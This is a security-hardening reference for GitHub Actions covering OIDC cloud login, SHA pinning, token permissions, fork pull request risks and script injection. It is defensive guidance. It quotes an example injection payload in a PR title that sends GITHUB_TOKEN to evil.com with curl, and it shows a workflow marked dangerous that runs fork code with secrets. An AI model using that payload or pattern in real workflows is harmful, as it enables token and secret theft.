# Security Hardening

> **Source:** https://docs.github.com/en/actions/security-for-github-actions | **Written for:** GitHub Actions 2026

GitHub Actions workflows run arbitrary code with access to your repository, secrets, and cloud infrastructure. Every workflow is an attack surface. This reference covers the practices that prevent credential theft, supply chain compromise, and injection attacks.

## Table of Contents

- [OIDC for Cloud Authentication](#oidc-for-cloud-authentication)
- [SHA Pinning Third-Party Actions](#sha-pinning-third-party-actions)
- [GITHUB_TOKEN Least Privilege](#github_token-least-privilege)
- [Fork Pull Request Security](#fork-pull-request-security)
- [Dependencies Section (2026)](#dependencies-section-2026)
- [Supply Chain Security](#supply-chain-security)
- [Script Injection Prevention](#script-injection-prevention)
- [Secret Protection](#secret-protection)
- [Workflow Permissions Audit Checklist](#workflow-permissions-audit-checklist)

---

## OIDC for Cloud Authentication

OpenID Connect eliminates long-lived cloud credentials from your repository secrets. GitHub's OIDC provider issues a short-lived JWT per job. Your cloud provider trusts GitHub as an identity provider and exchanges the token for temporary credentials that expire when the job ends.

```
Job starts → GitHub OIDC provider issues JWT
    │
    ▼
JWT claims: repository, ref, sha, workflow, actor, environment
    │
    ▼
Cloud provider validates JWT against trust policy
    │
    ▼
Cloud returns temporary credentials (15 min to 1 hour TTL)
```

Every workflow using OIDC must request the `id-token` permission:

```yaml
permissions:
  id-token: write
  contents: read
```

### Token Claims

| Claim | Example Value | Use |
|:------|:-------------|:----|
| `sub` | `repo:octo-org/my-repo:ref:refs/heads/main` | Primary trust filter |
| `repository` | `octo-org/my-repo` | Restrict to specific repo |
| `repository_owner` | `octo-org` | Restrict to org |
| `ref` | `refs/heads/main` | Restrict to branch |
| `workflow` | `deploy.yml` | Restrict to specific workflow |
| `environment` | `production` | Match deployment environment |

In 2026, GitHub added **repository custom properties** as OIDC claims. Organization-defined properties (team, tier, cost-center) appear in the JWT, enabling trust policies like "only repos tagged tier:production can assume the production IAM role."

### AWS: IAM Role with Web Identity Trust

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
      }
    }
  }]
}
```

```yaml
- name: Configure AWS credentials
  uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
  with:
    role-to-assume: arn:aws:iam::role/GitHubActionsDeployRole
    aws-region: us-east-1
```

### GCP: Workload Identity Federation

```yaml
- name: Authenticate to Google Cloud
  uses: google-github-actions/auth@71fee32a0bb7e97b4d33d548e7d957010649d8fa # v2.1.3
  with:
    workload_identity_provider: projects/PROJECT_NUM/locations/global/workloadIdentityPools/github-pool/providers/github-provider
    service_account: deploy@my-project.iam.gserviceaccount.com
```

### Azure: AD Federated Credentials

```yaml
- name: Azure Login
  uses: azure/login@6c251865b4e6290e7b78be643ea2d005bc51f69a # v2.1.1
  with:
    client-id: ${{ secrets.AZURE_CLIENT_ID }}
    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

---

## SHA Pinning Third-Party Actions

Action tags are mutable. A maintainer (or attacker) can move a tag to point at a different commit. SHA pinning locks to an exact commit:

```yaml
# DANGEROUS: tag can be overwritten
- uses: actions/checkout@v4

# SAFE: pinned to exact commit
- uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6
```

Always include the version as a trailing comment. Use Dependabot to keep SHAs updated:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    commit-message:
      prefix: "ci"
```

| Action Source | Pin? | Reason |
|:-------------|:-----|:-------|
| `actions/*` (GitHub official) | Yes | Even first-party can be compromised |
| Verified creator actions | Yes | Third-party risk |
| Community actions | Yes, and audit code | Highest risk |
| `docker://` images | Pin digest | Tags are mutable |

---

## GITHUB_TOKEN Least Privilege

As of 2026, new repositories default to a read-only `GITHUB_TOKEN`. Always set explicit permissions. Deny everything at workflow level, grant per-job:

```yaml
name: CI
on: [push, pull_request]

permissions: {}

jobs:
  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6
      - run: npm run lint

  deploy:
    needs: lint
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      deployments: write
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6
      - run: ./deploy.sh
```

| Permission | When Needed |
|:-----------|:-----------|
| `contents: read` | Checkout repository |
| `contents: write` | Push commits, create tags |
| `pull-requests: write` | Comment on PRs |
| `id-token: write` | OIDC cloud authentication |
| `packages: write` | Publish to GitHub Packages |
| `security-events: write` | Upload CodeQL results |
| `attestations: write` | Create artifact attestations |

---

## Fork Pull Request Security

| Aspect | `pull_request` | `pull_request_target` |
|:-------|:---------------|:----------------------|
| Code context | Fork's PR branch | Base repo default branch |
| Secrets | Not available | Available |
| GITHUB_TOKEN | Read-only | Write permissions of base |
| Safe for forks | Yes | Dangerous without precautions |

Safe pattern -- use `pull_request` for CI on fork PRs:

```yaml
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6
      - run: npm ci && npm test
```

Dangerous anti-pattern -- **never** checkout fork code in `pull_request_target`:

```yaml
# DO NOT DO THIS — runs fork code with base repo secrets
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # FORK code with secrets!
      - run: npm ci  # fork's install scripts have access to all secrets
```

If you need `pull_request_target` (to comment on PRs), never execute PR branch code. Use `actions/github-script` for API calls only. Require approval for first-time contributors.

---

## Dependencies Section (2026)

The `dependencies:` key declares SHA-locked action versions, enforced before any job starts:

```yaml
name: Secure CI

dependencies:
  actions/checkout: a5ac7e51b41094c92402da3b24376905380afc29   # v4.1.6
  actions/setup-node: 1a4442cacd436585916f15e7e73da3bfd52cb060  # v4.2.0
  actions/cache: 6849a6489940f00c2f30c0fb92c6274307ccb58a       # v4.1.2

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
      - uses: actions/setup-node@1a4442cacd436585916f15e7e73da3bfd52cb060
        with:
          node-version: 22
      - run: npm ci && npm test
```

If a `uses:` SHA does not match `dependencies:`, the run fails before provisioning. Hash mismatches stop execution immediately. This provides deterministic runs where workflows execute exactly the code reviewed in the PR.

---

## Supply Chain Security

| Source | Trust Level | Action |
|:-------|:-----------|:-------|
| `actions/*` | Highest | GitHub-maintained |
| Verified creator badge | High | Org verified by GitHub |
| Popular + audited | Medium | Review source before use |
| Unknown author | Low | Fork and self-host, or avoid |

Use artifact attestation with Sigstore:

```yaml
- uses: actions/attest-build-provenance@1c608d11d69870c2092266b3f9a6f3abbf17002c # v1.4.3
  with:
    subject-path: ./dist/my-binary
```

After a supply chain compromise (like the tj-actions/changed-files incident): audit affected workflows, check logs for unexpected network calls, rotate exposed secrets, replace with SHA-pinned fork, enable Dependabot alerts for Actions.

---

## Script Injection Prevention

Expressions in `run:` blocks are interpolated before shell execution. Attacker-controlled values (PR title, branch name, issue body) can inject arbitrary commands.

Vulnerable:

```yaml
- run: echo "PR title is ${{ github.event.pull_request.title }}"
```

A PR titled `"; curl http://evil.com/steal?token=$GITHUB_TOKEN #` becomes shell injection.

Safe -- use an intermediate environment variable:

```yaml
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

Safe -- use github-script for complex logic:

```yaml
- uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
  with:
    script: |
      const title = context.payload.pull_request.title;
      const pattern = /^(feat|fix|docs|chore|refactor|test|ci)(\(.+\))?: .{1,72}$/;
      if (!pattern.test(title)) {
        core.setFailed(`PR title "${title}" does not match conventional commit format`);
      }
```

Values that always require sanitization: `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`, `github.head_ref`.

---

## Secret Protection

GitHub automatically masks secrets in logs, but masking is bypassable (base64-encoding, character splitting). Use environment-scoped secrets to restrict access:

```yaml
jobs:
  deploy-production:
    runs-on: ubuntu-latest
    environment: production    # separate secrets, requires approval
    steps:
      - run: deploy --token ${{ secrets.PRODUCTION_DEPLOY_TOKEN }}
```

| Practice | Interval |
|:---------|:---------|
| Rotate service account keys | Every 30-90 days |
| Audit secret access in logs | Monthly |
| Remove unused secrets | Quarterly |
| Use OIDC over static credentials | Immediate |
| Scope secrets to environments | At creation time |

---

## Workflow Permissions Audit Checklist

| Check | Status |
|:------|:-------|
| Workflow-level `permissions: {}` set (deny by default) | |
| Each job declares only the permissions it needs | |
| No job has `contents: write` unless it pushes commits | |
| `id-token: write` only on OIDC jobs | |
| All third-party actions pinned to full commit SHA | |
| Dependabot or Renovate configured for action updates | |
| No `pull_request_target` with fork code checkout | |
| User-controlled inputs never interpolated in `run:` | |
| Secrets scoped to environments where possible | |
| No long-lived cloud credentials (use OIDC) | |
| `dependencies:` section locks action versions (2026+) | |
| Fork PR approval required for first-time contributors | |
| CodeQL or equivalent SAST enabled | |

Audit programmatically: `gh api repos/{owner}/{repo}/actions/permissions` and `gh api repos/{owner}/{repo}/actions/workflows`.
